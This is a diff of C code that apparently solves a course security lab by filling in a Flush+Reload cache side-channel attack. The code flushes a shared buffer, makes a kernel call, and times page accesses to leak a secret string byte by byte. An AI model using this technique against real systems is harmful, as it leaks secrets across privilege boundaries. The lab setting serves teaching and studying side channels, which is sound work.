@@ -40,14 +40,41 @@ static inline void call_kernel_part2(int kernel_fd, char *shared_memory, size_t 
 int run_attacker(int kernel_fd, char *shared_memory) {
     char leaked_str[LAB2_SECRET_MAX_LEN];
     size_t current_offset = 0;
+    size_t flush_offset;
+    uint64_t dram_latency_bf,dram_latency;
+    volatile char load_shared_mem;
 
     printf("Launching attacker\n");
+
+    //Flushing the memory here
+    for (flush_offset = 0; flush_offset < LAB2_SHARED_MEMORY_SIZE; flush_offset += 1) {
+        load_shared_mem = (char)(shared_memory+flush_offset);
+        //dram_latency_bf = time_access((void*)(shared_memory+flush_offset));
+        clflush((void*)(shared_memory+flush_offset));
+        //dram_latency = time_access((void*)(shared_memory+flush_offset));
+        //printf("\n This is the latency before flush %li and after flush %li", dram_latency_bf,dram_latency);
+    }
 
     for (current_offset = 0; current_offset < LAB2_SECRET_MAX_LEN; current_offset++) {
         char leaked_byte;
 
         // [Part 2]- Fill this in!
         // leaked_byte = ??
+
+        //Use call kernel to access data
+        call_kernel_part1(kernel_fd, shared_memory, current_offset);
+
+        //Reload and measure time and Decode the transmission to get data
+        for (flush_offset = 0; flush_offset <  LAB2_SHARED_MEMORY_SIZE; flush_offset += 4096) {
+            dram_latency = time_access((void*)(shared_memory+flush_offset));
+            clflush((void*)(shared_memory+flush_offset));
+            //printf("\n This is the cache line access latency: %li", dram_latency);
+            if (dram_latency < 70){
+                leaked_byte = (char)(flush_offset / LAB2_PAGE_SIZE);
+                //printf("\n This is the char we leaked %li, %li", dram_latency, (flush_offset/4096));
+                //break;
+            }
+        }
 
         leaked_str[current_offset] = leaked_byte;
         if (leaked_byte == '\x00') {
